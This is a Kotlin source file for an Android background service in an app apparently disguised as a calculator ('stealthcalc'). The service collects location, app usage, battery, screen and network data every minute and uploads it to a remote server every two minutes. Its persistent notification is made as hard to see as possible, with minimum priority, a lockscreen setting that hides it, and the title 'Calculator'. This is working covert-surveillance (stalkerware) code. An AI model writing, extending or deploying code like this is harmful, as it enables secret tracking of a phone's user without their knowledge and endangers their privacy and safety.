package com.stealthcalc.monitoring.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.lifecycle.LifecycleService
import androidx.lifecycle.lifecycleScope
import com.stealthcalc.core.logging.AppLogger
import com.stealthcalc.monitoring.collector.AppUsageCollector
import com.stealthcalc.monitoring.collector.BatteryCollector
import com.stealthcalc.monitoring.collector.LocationCollector
import com.stealthcalc.monitoring.collector.NetworkCollector
import com.stealthcalc.monitoring.collector.ScreenStateCollector
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.network.AgentApiClient
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class AgentService : LifecycleService() {

    companion object {
        private const val CHANNEL_ID = "agent_channel"
        private const val NOTIFICATION_ID = 9002
        private const val COLLECT_INTERVAL_MS = 60_000L
        private const val UPLOAD_INTERVAL_MS = 120_000L

        var isRunning = false
            private set

        fun start(context: Context) {
            context.startForegroundService(Intent(context, AgentService::class.java))
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, AgentService::class.java))
        }
    }

    @Inject lateinit var repository: MonitoringRepository
    @Inject lateinit var appUsageCollector: AppUsageCollector
    @Inject lateinit var batteryCollector: BatteryCollector
    @Inject lateinit var screenStateCollector: ScreenStateCollector
    @Inject lateinit var networkCollector: NetworkCollector
    @Inject lateinit var locationCollector: LocationCollector
    @Inject lateinit var apiClient: AgentApiClient

    private var collectJob: Job? = null
    private var uploadJob: Job? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        runCatching {
            createNotificationChannel()
            startForeground(
                NOTIFICATION_ID,
                buildNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
            )
        }.onFailure { e ->
            AppLogger.log(this, "[agent]", "Failed to promote to foreground: ${e.message}")
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return START_NOT_STICKY
        }

        isRunning = true
        startCollectors()
        startUploadLoop()
        AppLogger.log(this, "[agent]", "Agent service started")
        return START_STICKY
    }

    private fun startCollectors() {
        screenStateCollector.start()
        networkCollector.start()

        collectJob?.cancel()
        collectJob = lifecycleScope.launch {
            while (isActive) {
                runCatching {
                    appUsageCollector.collect()
                    batteryCollector.collect()
                    locationCollector.collect()
                    networkCollector.collectSnapshot()
                }.onFailure { e ->
                    AppLogger.log(this@AgentService, "[agent]", "Collection error: ${e.message}")
                }
                delay(COLLECT_INTERVAL_MS)
            }
        }
    }

    private fun startUploadLoop() {
        uploadJob?.cancel()
        uploadJob = lifecycleScope.launch {
            while (isActive) {
                delay(UPLOAD_INTERVAL_MS)
                runCatching {
                    val unsent = repository.getUnsent()
                    if (unsent.isNotEmpty() && repository.isPaired) {
                        val success = apiClient.uploadBatch(unsent)
                        if (success) {
                            repository.markUploaded(unsent.map { it.id })
                            repository.setLastSync(System.currentTimeMillis())
                        }
                    }
                    repository.pruneOldEvents()
                }.onFailure { e ->
                    AppLogger.log(this@AgentService, "[agent]", "Upload error: ${e.message}")
                }
            }
        }
    }

    override fun onDestroy() {
        isRunning = false
        collectJob?.cancel()
        uploadJob?.cancel()
        screenStateCollector.stop()
        networkCollector.stop()
        AppLogger.log(this, "[agent]", "Agent service stopped")
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }

    private fun createNotificationChannel() {
        val channel = NotificationChannel(
            CHANNEL_ID,
            "Monitoring",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            setShowBadge(false)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
        }
        (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
            .createNotificationChannel(channel)
    }

    private fun buildNotification(): Notification =
        NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setContentTitle("Calculator")
            .setContentText("Running")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .build()
}
